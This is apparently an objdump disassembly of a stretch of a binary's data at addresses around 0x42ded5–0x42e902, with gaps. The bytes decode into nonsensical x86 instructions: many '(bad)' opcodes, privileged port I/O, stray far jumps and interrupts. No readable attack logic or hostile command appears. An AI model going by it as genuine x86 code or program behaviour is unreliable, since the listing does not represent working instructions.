  42ded5:	aad    0xac
  42ded7:	into   
  42ded8:	mov    esi,0xe7fd0d10
  42dedd:	iret   
  42dede:	mov    bl,al
  42dee0:	int    0xe5
  42dee2:	mov    ecx,0xe65b1686
  42dee7:	out    0x52,al
  42dee9:	call   0xad5fd8bd
  42deee:	or     al,0xe1
  42def0:	int3   
  42def1:	xor    DWORD PTR [ebp-0x41],esi
  42def4:	std    
  42def5:	jmp    0x6aea:0xa24dc48c
  42defc:	push   esi
  42defd:	test   edx,edi
  42deff:	add    al,0x33
  42df01:	(bad)  
  42df03:	add    eax,0x26163eb2
  42df08:	xchg   edx,eax
  42df09:	cmp    ch,BYTE PTR [ecx+ebp*8]
  42df0c:	mov    eax,ds:0xf9846696
  42df11:	push   esp
  42df12:	mov    cl,BYTE PTR [esi+0x4f]
  42df15:	and    eax,0xc3a3219b
  42df1a:	jg     0x42df50
  42df1c:	int3   
  42df1d:	jp     0x42df68
  42df1f:	imul   ebp,DWORD PTR [edi+0x44c68494],0xaef7f4b7
  42df29:	mov    esp,0x5c28f762
  42df2e:	inc    esi
  42df2f:	push   es
  42df30:	mov    eax,cs:0x66b56321
  42df36:	shl    DWORD PTR [ebp-0x74],cl
  42df39:	jnp    0x42df75
  42df3b:	dec    edx
  42df3c:	shl    ah,0xef
  42df3f:	jns    0x42df7b
  42df41:	sar    DWORD PTR [edx+0x37],1
  42df44:	test   DWORD PTR [edi+0x21e4b01],edi
  42df4a:	int3   
  42df4b:	punpckhbw mm7,QWORD PTR [esi-0x5ec48c8d]
  42df52:	or     ch,BYTE PTR [ecx-0x1736ec67]
  42df58:	and    eax,0x133fb47f
  42df5d:	xor    al,ah
  42df5f:	fmul   DWORD PTR [edi+edi*1+0x4d]
  42df63:	fidiv  WORD PTR [edx]
  42df65:	mov    al,0x91
  42df67:	inc    edx
  42df68:	jbe    0x42df4d
  42df6a:	clc    
  42df6b:	jae    0x42df67
  42df6d:	jns    0x42df93
  42df6f:	adc    al,BYTE PTR [ebx]
  42df71:	cmp    ebx,ebp
  42df73:	cdq    
  42df74:	retf   0x641
  42df77:	shr    DWORD PTR [edi+esi*1-0x9],1
  42df7b:	mov    ebp,eax
  42df7d:	data16 cli 
  42df7f:	xchg   ebx,eax
  42df80:	push   edi
  42df81:	js     0x42df6e
  42df83:	mov    esi,0xca37ce35
  42df88:	and    eax,0x133fc16b
  42df8d:	lahf   
  42df8e:	inc    edx
  42df8f:	dec    esi
	...
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x1a]
  42e001:	ds or  eax,0x1ec3472
  42e007:	add    BYTE PTR [ecx+eax*1],al
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	mov    ah,0x1f
  42e00e:	and    BYTE PTR [ecx],0x78
  42e011:	pushf  
  42e012:	inc    esp
  42e013:	loope  0x42e036
  42e015:	mov    edi,0x73c2d49
  42e01a:	bound  esp,QWORD PTR [edi-0x5abc7bf6]
  42e020:	mov    dh,0xab
  42e022:	mov    edi,0x9da45a2d
  42e027:	push   edx
  42e028:	shr    DWORD PTR [ebp-0x7f],cl
  42e02b:	fistp  DWORD PTR [edx+0x7d]
  42e02e:	out    0x23,al
  42e030:	test   DWORD PTR [esi+0x5fb2fc63],eax
  42e036:	mov    ebx,0x64231d81
  42e03b:	test   al,0x7c
  42e03d:	add    DWORD PTR [esp+eax*2-0x582e8f44],0xfffffff9
  42e045:	(bad)  
  42e046:	pop    esi
  42e047:	jmp    0x42e064
  42e049:	pop    esi
  42e04a:	sahf   
  42e04b:	paddusw mm6,QWORD PTR ds:0xdfd9d480
  42e052:	repnz repnz push es
  42e055:	fistp  DWORD PTR [ebx+esi*1]
  42e058:	je     0x42e0a9
  42e05a:	xchg   edi,eax
  42e05b:	out    dx,eax
  42e05c:	xchg   ecx,eax
  42e05d:	push   esi
  42e05e:	std    
  42e05f:	scas   al,BYTE PTR es:[edi]
  42e060:	inc    ebp
  42e061:	sti    
  42e062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e063:	(bad)  
  42e064:	jmp    0xcabf94d9
  42e069:	call   FWORD PTR [esi+0x2a6c3c38]
  42e06f:	pop    eax
  42e070:	popf   
  42e071:	mov    ds:0xfaddd4bc,eax
  42e076:	(bad)  
  42e077:	cmc    
  42e078:	je     0x42e0d6
  42e07a:	mov    eax,DWORD PTR [ecx+0xb]
  42e07d:	jae    0x42e00f
  42e07f:	ds inc edx
  42e081:	int    0x90
  42e083:	or     edx,DWORD PTR [eax]
  42e085:	mov    eax,ds:0x67b65b2a
  42e08a:	xchg   ebp,eax
  42e08b:	sub    DWORD PTR [edx],0xffffffbc
  42e08e:	pop    ebx
  42e08f:	sub    dl,ch
  42e091:	mov    ecx,0xc9e3416e
  42e096:	cdq    
  42e097:	pop    edx
  42e098:	cli    
  42e099:	in     eax,0x6d
  42e09b:	xchg   edi,eax
  42e09c:	xchg   ecx,eax
  42e09d:	rcr    BYTE PTR [ebx],1
  42e09f:	retf   0xb9db
  42e0a2:	push   0x5f5e7f57
  42e0a7:	(bad)  
  42e0a8:	push   0x4b
  42e0aa:	call   0x6e1ee51d
  42e0af:	dec    edx
  42e0b0:	cmp    esi,DWORD PTR [ebp-0x504a9dd0]
  42e0b6:	jo     0x42e073
  42e0b8:	jl     0x42e0b5
  42e0ba:	add    al,0xf5
  42e0bc:	enter  0xc2da,0x34
  42e0c0:	mov    ds:0xf151b4d4,al
  42e0c5:	ins    DWORD PTR es:[edi],dx
  42e0c6:	mov    bl,0x38
  42e0c8:	xchg   ebx,eax
  42e0c9:	add    al,0x60
  42e0cb:	stc    
  42e0cc:	mov    edi,0xbdc39ad0
  42e0d1:	cmp    edi,ebx
  42e0d3:	aad    0x9c
  42e0d5:	std    
  42e0d6:	lock sub cl,cl
  42e0d9:	fmul   QWORD PTR [esi+0x6]
  42e0dc:	jmp    0x1aaa:0x31b337b
  42e0e3:	push   cs
  42e0e4:	jmp    0x65a9:0x1308c10b
  42e0eb:	add    DWORD PTR [edx+0x1d],0x8cf5cc8d
  42e0f2:	xor    DWORD PTR [ebx+0x5d],esp
  42e0f5:	jb     0x42e0b4
  42e0f7:	jg     0x42e106
  42e0f9:	mov    cl,0x99
  42e0fb:	inc    edi
  42e0fc:	pop    ss
  42e0fd:	sub    ah,cl
  42e0ff:	mov    DWORD PTR [ebx+0x42],ebp
  42e102:	repnz jecxz 0x42e0ac
  42e105:	adc    al,0xfc
  42e107:	popf   
  42e108:	sahf   
  42e109:	aas    
  42e10a:	and    DWORD PTR [ebx-0x3bbcbe7f],0x0
	...
  42e171:	add    BYTE PTR [eax],al
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	and    BYTE PTR [eax],0xe6
  42e183:	gs cmp ch,ch
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	xor    al,0x17
  42e18e:	iret   
  42e18f:	sbb    BYTE PTR [edi],ah
  42e191:	or     eax,0xb4775ca7
  42e196:	mov    dl,0x6d
  42e198:	push   es
  42e199:	pop    eax
  42e19a:	popa   
  42e19b:	jb     0x42e182
  42e19d:	imul   esi,ecx,0x6e
  42e1a0:	into   
  42e1a1:	inc    ebp
  42e1a2:	int3   
  42e1a3:	cwde   
  42e1a4:	fdivr  st,st(3)
  42e1a7:	rol    BYTE PTR [ebx],1
  42e1a9:	jbe    0x42e1ae
  42e1ab:	push   ecx
  42e1ac:	stc    
  42e1ad:	ins    BYTE PTR es:[edi],dx
  42e1ae:	dec    edi
  42e1af:	mov    edi,0x1621e18c
  42e1b4:	adc    al,0xe9
  42e1b6:	xor    ecx,DWORD PTR [edx+eiz*8]
  42e1b9:	fnsave [esi+0x32]
  42e1bc:	ins    BYTE PTR es:[edi],dx
  42e1bd:	mov    al,ds:0x275e9cd
  42e1c2:	pop    edi
  42e1c3:	push   es
  42e1c4:	xor    esp,DWORD PTR [eax+0x239f9670]
  42e1ca:	into   
  42e1cb:	push   edx
  42e1cc:	dec    ebp
  42e1cd:	mov    WORD PTR [esi],cs
  42e1cf:	mov    ds:0xe3b65735,al
  42e1d4:	lds    ebx,FWORD PTR ds:0xe82013a9
  42e1da:	add    DWORD PTR [ebp+0x203a8814],ebp
  42e1e0:	lock cli 
  42e1e2:	ins    DWORD PTR es:[edi],dx
  42e1e3:	push   eax
  42e1e4:	aas    
  42e1e5:	pop    ebx
  42e1e6:	add    al,0x5f
  42e1e8:	idiv   DWORD PTR [edi]
  42e1ea:	call   0xaf63328a
  42e1ef:	xor    ah,BYTE PTR [ebp-0x26]
  42e1f2:	xor    al,0x9e
  42e1f4:	hlt    
  42e1f5:	stos   BYTE PTR es:[edi],al
  42e1f6:	mov    dh,0x9
  42e1f8:	lahf   
  42e1f9:	mov    DWORD PTR [esi],esp
  42e1fb:	xchg   BYTE PTR [ebx+0xf],dl
  42e1fe:	mov    dl,dh
  42e200:	sub    esi,DWORD PTR [ecx]
  42e202:	rcr    DWORD PTR [esi-0x2eb2c688],0xca
  42e209:	sbb    bh,BYTE PTR [ecx]
  42e20b:	dec    ecx
  42e20c:	int3   
  42e20d:	and    al,0xb2
  42e20f:	lods   al,BYTE PTR ds:[esi]
  42e210:	dec    ecx
  42e211:	stos   DWORD PTR es:[edi],eax
  42e212:	mov    ds:0xcd757142,eax
  42e217:	fwait
  42e218:	sub    BYTE PTR [ebx-0x5d],cl
  42e21b:	dec    ebp
  42e21c:	mov    al,ds:0xe4c2d140
  42e221:	xchg   esi,eax
  42e222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e223:	das    
  42e224:	adc    DWORD PTR [esi-0x44],ecx
  42e227:	not    BYTE PTR [esi+edi*4-0x43]
  42e22b:	xor    DWORD PTR [eax],0xf
  42e22e:	in     al,0x3a
  42e230:	pop    ebx
  42e231:	nop
  42e232:	mov    ebx,0xf01368d2
  42e237:	(bad)  
  42e238:	sti    
  42e239:	jecxz  0x42e2a0
  42e23b:	dec    ecx
  42e23c:	add    ebp,0xffffffed
  42e23f:	fild   WORD PTR [ecx]
  42e241:	in     eax,dx
  42e242:	leave  
  42e243:	mov    ebx,0xa9653dc1
  42e248:	or     bl,BYTE PTR [edi]
  42e24a:	clc    
  42e24b:	ds in  eax,dx
  42e24d:	call   0x3ad5:0x57d2521b
  42e254:	push   ds
  42e255:	mov    al,ds:0x7c83fda4
  42e25a:	adc    BYTE PTR [ebp-0x5665b913],bh
  42e260:	pop    edi
  42e261:	push   ecx
  42e262:	push   esp
  42e263:	int3   
  42e264:	and    eax,0x14a5fad9
  42e269:	(bad)  
  42e26a:	mov    esp,0xfd3867b
  42e26f:	or     DWORD PTR [esi-0xb7a42fa],eax
  42e275:	or     ch,BYTE PTR [eax]
  42e277:	ss stos DWORD PTR es:[edi],eax
  42e279:	push   ebp
  42e27a:	mov    WORD PTR [eax-0x12],?
  42e27d:	sbb    al,0x8a
  42e27f:	xrelease mov DWORD PTR [esi+0x21e19dbd],ebp
  42e286:	ja     0x42e2a9
  42e288:	int3   
  42e289:	xor    edx,DWORD PTR ds:0xc0e431e0
  42e28f:	xchg   DWORD PTR [eax],eax
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0xd1199140
  42e301:	mov    ch,0x58
  42e303:	das    
  42e304:	cmp    al,0xee
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	dec    esi
  42e30d:	ins    BYTE PTR es:[edi],dx
  42e30e:	bound  ebx,QWORD PTR [ecx]
  42e310:	fwait
  42e311:	cmp    eax,ebp
  42e313:	outs   dx,DWORD PTR ds:[esi]
  42e314:	inc    esi
  42e315:	lock stos BYTE PTR es:[edi],al
  42e317:	and    eax,0xc01f19e0
  42e31c:	scas   al,BYTE PTR es:[edi]
  42e31d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e31f:	mov    cl,0x8a
  42e321:	push   ebp
  42e322:	sub    esp,DWORD PTR [esi]
  42e324:	mov    eax,0x76cddb0f
  42e329:	or     eax,0x3e637c0e
  42e32e:	arpl   WORD PTR [edi],di
  42e330:	or     BYTE PTR [edx],dh
  42e332:	cli    
  42e333:	mov    DWORD PTR [esi-0x1b],edx
  42e336:	sub    BYTE PTR [edx+0xaa87b40],ah
  42e33c:	out    dx,al
  42e33d:	push   ebx
  42e33e:	xchg   ebx,eax
  42e33f:	call   0x137cd24d
  42e344:	cwde   
  42e345:	or     BYTE PTR ds:0x679c96f1,bl
  42e34b:	sub    eax,0x2d68addc
  42e350:	ins    DWORD PTR es:[edi],dx
  42e351:	jmp    0xb47d:0xe84b1a60
  42e358:	nop
  42e359:	(bad)  
  42e35a:	adc    BYTE PTR [ebx+0x3207fd73],ch
  42e360:	xor    BYTE PTR ds:0x37f2eac2,0x4a
  42e367:	adc    DWORD PTR es:[eax-0x445e804a],esi
  42e36e:	in     al,dx
  42e36f:	xor    dh,ah
  42e371:	add    eax,0xb90bc317
  42e376:	fadd   QWORD PTR [edx+0x187d557b]
  42e37c:	inc    ebp
  42e37d:	into   
  42e37e:	(bad)  
  42e380:	out    0xa1,eax
  42e382:	fist   DWORD PTR [ebp+0x7e]
  42e385:	(bad)  
  42e387:	aaa    
  42e388:	jl     0x42e313
  42e38a:	dec    esp
  42e38b:	xchg   esi,esi
  42e38d:	dec    eax
  42e38e:	xchg   BYTE PTR [ebx+edx*4+0x4e],dl
  42e392:	adc    eax,0x951782e
  42e397:	xchg   BYTE PTR [eax+0x5f3ea648],bh
  42e39d:	rcr    BYTE PTR [edi+ebx*2+0x29],0xc2
  42e3a2:	mov    ds:0x2b1ef4b3,eax
  42e3a7:	pushf  
  42e3a8:	stc    
  42e3a9:	dec    esp
  42e3aa:	pop    edx
  42e3ab:	push   edx
  42e3ac:	dec    ecx
  42e3ad:	jle    0x42e3bd
  42e3af:	pop    edi
  42e3b0:	inc    ebx
  42e3b1:	paddsb mm1,QWORD PTR [ebx+0x3e90a4ab]
  42e3b8:	mov    ah,0xb
  42e3ba:	fcmovne st,st(0)
  42e3bc:	outs   dx,BYTE PTR ds:[esi]
  42e3bd:	jae    0x42e427
  42e3bf:	shl    DWORD PTR [ebx+edi*4],cl
  42e3c2:	repz sahf 
  42e3c4:	push   edx
  42e3c5:	call   0xcf9e427c
  42e3ca:	cli    
  42e3cb:	sti    
  42e3cc:	jbe    0x42e400
  42e3ce:	jmp    0x42e403
  42e3d0:	out    0xa4,eax
  42e3d2:	add    bl,BYTE PTR [ecx]
  42e3d4:	repnz sub al,0x95
  42e3d7:	pop    edx
  42e3d8:	adc    eax,0x969526e3
  42e3dd:	jp     0x42e3d2
  42e3df:	mov    ds:0xbdf7cb9b,eax
  42e3e4:	aad    0xf4
  42e3e6:	mov    dl,0x67
  42e3e8:	pop    es
  42e3e9:	f2xm1  
  42e3eb:	cli    
  42e3ec:	jb     0x42e412
  42e3ee:	or     edi,DWORD PTR [edx+0x100a5043]
  42e3f4:	addr16 lock push ss
  42e3f7:	push   0xc
  42e3f9:	arpl   dx,cx
  42e3fb:	sbb    eax,0x1d35702d
  42e400:	sbb    DWORD PTR [edx],0xffffff99
  42e403:	out    0xd1,eax
  42e405:	loop   0x42e440
  42e407:	int    0xca
  42e409:	in     eax,dx
  42e40a:	sub    dh,BYTE PTR [esi]
  42e40c:	sub    BYTE PTR [eax+0x8],ch
  42e40f:	mov    dh,0x0
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	(bad)  
  42e481:	jecxz  0x42e4f6
  42e483:	add    DWORD PTR [eax-0x11],0x1
  42e487:	add    BYTE PTR [ecx+eax*1],al
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	push   ss
  42e48d:	mov    al,0x8a
  42e48f:	mov    bl,0xa3
  42e491:	inc    esi
  42e492:	fstp   QWORD PTR [ebp+0x421d5a3e]
  42e498:	jge    0x42e4be
  42e49a:	mov    ebx,0xe673f8d
  42e49f:	jecxz  0x42e450
  42e4a1:	in     eax,dx
  42e4a2:	rep outs dx,BYTE PTR ds:[esi]
  42e4a4:	(bad)  
  42e4a5:	stos   DWORD PTR es:[edi],eax
  42e4a6:	add    eax,0xd4e32c5b
  42e4ab:	dec    ecx
  42e4ac:	mov    edx,0xe8d4030b
  42e4b1:	adc    al,0xfa
  42e4b3:	mov    bl,0x99
  42e4b5:	std    
  42e4b6:	stos   BYTE PTR es:[edi],al
  42e4b7:	fdiv   QWORD PTR [ebp+esi*8-0x6f]
  42e4bb:	imul   esi,DWORD PTR [ebx+0x293e4af7],0x5841532c
  42e4c5:	adc    eax,0x218106a2
  42e4ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4cb:	loope  0x42e4a6
  42e4cd:	cwde   
  42e4ce:	cmc    
  42e4cf:	iret   
  42e4d0:	mov    edi,0x511916f1
  42e4d5:	lods   eax,DWORD PTR ds:[esi]
  42e4d6:	pop    ebp
  42e4d7:	popf   
  42e4d8:	xchg   ecx,eax
  42e4d9:	clc    
  42e4da:	and    eax,0xeeb429c4
  42e4df:	jg     0x42e4a5
  42e4e1:	aam    0x13
  42e4e3:	xor    DWORD PTR [eax+0x7f],0x98b83076
  42e4ea:	xchg   ebx,eax
  42e4eb:	dec    ebx
  42e4ec:	jnp    0x42e4b5
  42e4ee:	and    dl,BYTE PTR [ecx-0x64]
  42e4f1:	mov    dl,0x27
  42e4f3:	push   esi
  42e4f4:	stos   DWORD PTR es:[edi],eax
  42e4f5:	test   al,0x90
  42e4f7:	mov    ds:0xcc6b357a,eax
  42e4fc:	ror    BYTE PTR [eax-0xa],0x48
  42e500:	cmp    esi,DWORD PTR [esi+0x42]
  42e503:	xor    eax,0x4bf42d9c
  42e508:	mov    BYTE PTR ds:0xb354efba,bl
  42e50e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e50f:	adc    BYTE PTR [ebx-0x64913936],dl
  42e515:	js     0x42e4fd
  42e517:	fwait
  42e518:	int    0x80
  42e51a:	cmp    ebp,0x22
  42e51d:	xor    edi,edx
  42e51f:	jmp    0x19:0xadda4159
  42e526:	pop    ds
  42e527:	mov    al,0x53
  42e529:	das    
  42e52a:	jl     0x42e58e
  42e52c:	xchg   esi,eax
  42e52d:	lea    ebx,gs:[eax-0x5907b579]
  42e534:	arpl   WORD PTR [edi],di
  42e536:	leave  
  42e537:	fisub  DWORD PTR [edi-0x3df9b00b]
  42e53d:	shl    BYTE PTR [esi],cl
  42e53f:	sbb    al,0xd5
  42e541:	pop    ebx
  42e542:	nop
  42e543:	fldenv [esi+eiz*4]
  42e546:	out    dx,al
  42e547:	cdq    
  42e548:	add    dh,bl
  42e54a:	and    ah,0x48
  42e54d:	mov    ecx,0x8064a46e
  42e552:	push   ecx
  42e553:	adc    eax,0x56d713c5
  42e558:	les    ebp,FWORD PTR [edx]
  42e55a:	sbb    al,0x69
  42e55c:	pushf  
  42e55d:	and    dl,BYTE PTR [eax+0x3c]
  42e560:	cld    
  42e561:	lods   eax,DWORD PTR ds:[esi]
  42e562:	push   es
  42e563:	test   eax,0x9915b6c7
  42e568:	loope  0x42e54a
  42e56a:	jno    0x42e5dd
  42e56c:	xor    eax,0x524163e0
  42e571:	jb     0x42e59f
  42e573:	and    ebx,DWORD PTR ds:0x3701ca96
  42e579:	and    ch,BYTE PTR [edx]
  42e57b:	add    al,0x57
  42e57d:	call   0x5ad:0x6b7e42db
  42e584:	test   bl,bh
  42e586:	popf   
  42e587:	pop    ebp
  42e588:	push   edi
  42e589:	ret    
  42e58a:	aad    0x17
  42e58c:	test   DWORD PTR [ecx],esp
  42e58e:	lock fild WORD PTR [eax]
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	in     eax,dx
  42e601:	xor    BYTE PTR [ebx+0x1f04425],0x0
  42e608:	add    al,0x1
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	sbb    bh,BYTE PTR [esi+0x2e0eeff3]
  42e612:	xchg   ebx,eax
  42e613:	jecxz  0x42e5cd
  42e615:	popa   
  42e616:	shl    BYTE PTR [ebx+0x470a727c],1
  42e61c:	lods   eax,DWORD PTR ds:[esi]
  42e61d:	inc    eax
  42e61e:	fidiv  WORD PTR [edx+0x76d0343e]
  42e624:	xor    DWORD PTR [bx+di+0x66],edi
  42e628:	mov    BYTE PTR [edi],bh
  42e62a:	(bad)  
  42e62b:	stos   BYTE PTR es:[edi],al
  42e62c:	hlt    
  42e62d:	ficom  WORD PTR [ebx-0x75]
  42e630:	sub    DWORD PTR [ebx],0xffffffa0
  42e633:	fdiv   DWORD PTR [edx-0x78]
  42e636:	sbb    eax,0xb3e97527
  42e63b:	inc    esp
  42e63c:	mov    ch,0x65
  42e63e:	repz mov ds:0x9f0af67d,al
  42e644:	pop    ss
  42e645:	push   ebx
  42e646:	push   ebx
  42e647:	retf   0x11e8
  42e64a:	sub    al,0xdd
  42e64c:	out    dx,eax
  42e64d:	mov    edx,esp
  42e64f:	pop    ss
  42e650:	add    al,0x70
  42e652:	and    al,BYTE PTR [ebx+edx*2]
  42e655:	jnp    0x42e5e1
  42e657:	mov    ch,0xdb
  42e659:	rcr    BYTE PTR [edx+0x33f507a7],0x9
  42e660:	aad    0xc
  42e662:	pop    edi
  42e663:	jns    0x42e5f0
  42e665:	rep lods eax,DWORD PTR ds:[esi]
  42e667:	ficomp DWORD PTR [ecx+edx*4+0x3272ec34]
  42e66e:	aaa    
  42e66f:	ins    BYTE PTR es:[edi],dx
  42e670:	pop    ebp
  42e671:	ficom  DWORD PTR [ecx]
  42e673:	imul   ecx,DWORD PTR [eax+0x34],0x3f
  42e677:	adc    BYTE PTR [ecx+0x5293becd],bh
  42e67d:	ds push esp
  42e67f:	out    0xea,eax
  42e681:	or     bh,0x4f
  42e684:	mov    bh,0xa9
  42e686:	jecxz  0x42e69c
  42e688:	sti    
  42e689:	sbb    al,0xfa
  42e68b:	scas   al,BYTE PTR es:[edi]
  42e68c:	fstp   DWORD PTR ds:0x97567cf
  42e692:	mov    esp,0x137a8721
  42e697:	adc    DWORD PTR [esi-0x3b2fd6f8],ecx
  42e69d:	fbld   TBYTE PTR [edi+0x2ce1ba76]
  42e6a3:	pop    esp
  42e6a4:	enter  0x3008,0x4a
  42e6a8:	aam    0xa7
  42e6aa:	ins    DWORD PTR es:[edi],dx
  42e6ab:	jp     0x42e6c8
  42e6ad:	dec    edx
  42e6ae:	enter  0xb2a9,0x24
  42e6b2:	rol    ah,cl
  42e6b4:	push   edi
  42e6b5:	sti    
  42e6b6:	mov    esi,0x8433d189
  42e6bb:	add    ecx,DWORD PTR [edi]
  42e6bd:	jmp    0x42e72c
  42e6bf:	mov    dh,0x6c
  42e6c1:	cs mov ebp,0xb0ad4cac
  42e6c7:	pop    ss
  42e6c8:	std    
  42e6c9:	rcl    BYTE PTR [esp+edi*4+0x37],0xca
  42e6ce:	adc    BYTE PTR [edi+edx*4+0x19b4cc81],cl
  42e6d5:	retf   0x5936
  42e6d8:	mov    WORD PTR [ecx+0x6cced0be],ds
  42e6de:	pusha  
  42e6df:	sbb    DWORD PTR [eax-0x65],ebp
  42e6e2:	adc    BYTE PTR [ebx+0x160f29f8],dh
  42e6e8:	stos   DWORD PTR es:[edi],eax
  42e6e9:	adc    ebx,DWORD PTR [edx]
  42e6eb:	inc    eax
  42e6ec:	aaa    
  42e6ed:	inc    ebx
  42e6ee:	pusha  
  42e6ef:	js     0x42e72d
  42e6f1:	pop    ds
  42e6f2:	push   ebx
  42e6f3:	sub    BYTE PTR [edi-0x21],dl
  42e6f6:	inc    ebx
  42e6f7:	and    dh,BYTE PTR [edi-0x67]
  42e6fa:	int3   
  42e6fb:	out    dx,al
  42e6fc:	push   cs
  42e6fd:	sti    
  42e6fe:	sub    eax,0xf76c7216
  42e703:	(bad)  
  42e705:	ins    BYTE PTR es:[edi],dx
  42e706:	mov    edi,0x3e41b48a
  42e70b:	adc    al,0xe2
  42e70d:	mov    ecx,0xbe7d
	...
  42e772:	add    BYTE PTR [eax],al
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fidiv  DWORD PTR [eax+eiz*2+0x1]
  42e783:	add    al,0x48
  42e785:	icebp  
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	addr16 pop ecx
  42e78e:	test   DWORD PTR [ecx+ebp*2-0x2cc47c48],0x9cb09908
  42e799:	fst    DWORD PTR [ebx]
  42e79b:	xchg   ebx,eax
  42e79c:	ja     0x42e7c6
  42e79e:	push   edi
  42e79f:	inc    esp
  42e7a0:	mov    bh,BYTE PTR [ecx]
  42e7a2:	sbb    al,0x77
  42e7a4:	push   eax
  42e7a5:	sbb    ch,BYTE PTR [ebx+esi*8]
  42e7a8:	pop    esi
  42e7a9:	xor    eax,0x45b4d2fe
  42e7ae:	scas   eax,DWORD PTR es:[edi]
  42e7af:	mov    ecx,0xa987dea1
  42e7b4:	dec    DWORD PTR [ecx]
  42e7b6:	pop    esp
  42e7b7:	mov    bh,0x27
  42e7b9:	loope  0x42e820
  42e7bb:	stc    
  42e7bc:	fldenv [ecx-0x13a64691]
  42e7c2:	sbb    BYTE PTR [ebx+ebx*4+0x3a],ah
  42e7c6:	pop    es
  42e7c7:	popa   
  42e7c8:	rol    DWORD PTR [ebx-0x2c687527],cl
  42e7ce:	pop    esi
  42e7cf:	aad    0x6
  42e7d1:	or     eax,ebp
  42e7d3:	jecxz  0x42e790
  42e7d5:	adc    eax,0xdbd7cea7
  42e7da:	ja     0x42e84a
  42e7dc:	rol    BYTE PTR [ecx+edx*8-0x73303ea6],1
  42e7e3:	imul   edx,DWORD PTR ds:0xc4c94621,0x73
  42e7ea:	dec    ecx
  42e7eb:	xchg   BYTE PTR [eax+0x17],ah
  42e7ee:	inc    ebx
  42e7ef:	(bad)  
  42e7f0:	test   DWORD PTR [edi-0x86fc0c1],0xeb8beb3c
  42e7fa:	jge    0x42e791
  42e7fc:	aaa    
  42e7fd:	(bad)  
  42e7fe:	push   ebx
  42e7ff:	retf   0xabf2
  42e802:	in     al,dx
  42e803:	test   DWORD PTR [ebx+0x4f5bfc0c],0xedd77dc3
  42e80d:	call   0xfbae:0x3f6e5c5
  42e814:	fstp   TBYTE PTR [ebx+0x6d]
  42e817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e818:	push   ebx
  42e819:	adc    DWORD PTR [ebx-0x3d],eax
  42e81c:	pop    esi
  42e81d:	pushf  
  42e81e:	popa   
  42e81f:	mov    ebp,0xe703e0c9
  42e824:	stc    
  42e825:	add    BYTE PTR [ecx+edi*4-0x64e713a2],ah
  42e82c:	and    esi,DWORD PTR [edi+0x77]
  42e82f:	lahf   
  42e830:	adc    cl,BYTE PTR [eax-0x2691c678]
  42e836:	jo     0x42e816
  42e838:	jp     0x42e81e
  42e83a:	cdq    
  42e83b:	stos   BYTE PTR es:[edi],al
  42e83c:	out    dx,al
  42e83d:	(bad)  
  42e83e:	call   0x7c42d730
  42e843:	mov    bl,0x1
  42e845:	pop    ebp
  42e846:	inc    esp
  42e847:	lods   eax,DWORD PTR ds:[esi]
  42e848:	pushf  
  42e849:	or     esi,DWORD PTR [eax+0x3]
  42e84c:	inc    esp
  42e84d:	inc    edi
  42e84e:	test   al,0x15
  42e850:	hlt    
  42e851:	and    ch,BYTE PTR [ecx+0x61]
  42e854:	out    0x38,eax
  42e856:	mov    DWORD PTR [ebx],0xf20060c5
  42e85c:	pop    edi
  42e85d:	xchg   esp,eax
  42e85e:	mov    dl,0x98
  42e860:	pop    esp
  42e861:	push   ecx
  42e862:	jae    0x42e823
  42e864:	fild   QWORD PTR [eax]
  42e866:	test   al,0x3c
  42e868:	ins    BYTE PTR es:[edi],dx
  42e869:	fnstsw WORD PTR [esi+0x5e]
  42e86c:	pusha  
  42e86d:	mov    ah,BYTE PTR [ebx+0x181fb32c]
  42e873:	lock ror eax,0x4a
  42e877:	jne    0x42e8f7
  42e879:	bound  edx,QWORD PTR [edx]
  42e87b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e87c:	sbb    eax,edi
  42e87e:	or     esi,edi
  42e880:	fisttp DWORD PTR [ecx+edi*2+0x1f]
  42e884:	bound  ebx,QWORD PTR [edx-0x793c60c6]
  42e88a:	xor    eax,0x3a667f37
  42e88f:	ins    DWORD PTR es:[edi],dx
	...
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0x4cdc07d5]
  42e901:	pop    ds
  42e902:	push   es
